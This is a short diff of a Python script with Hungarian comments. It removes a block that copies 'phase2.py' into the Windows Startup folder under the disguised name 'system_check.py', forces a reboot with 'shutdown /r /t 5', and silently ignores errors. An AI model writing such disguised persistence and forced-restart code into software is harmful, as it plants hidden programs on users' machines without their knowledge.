@@ -123,16 +123,6 @@ startup_mappa = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Men
 phase2_fajl = "phase2.py" 
 cel_utvonal = os.path.join(startup_mappa, "system_check.py") # A startupban más néven mentjük
 
-try:
-    # Másoljuk a phase2.py-t a Startup mappába
-    shutil.copy(phase2_fajl, cel_utvonal)
-    
-    # Újraindítás
-    os.system("shutdown /r /t 5")
-except Exception as e:
-    pass
-
-sys.exit()
 
 import os
 
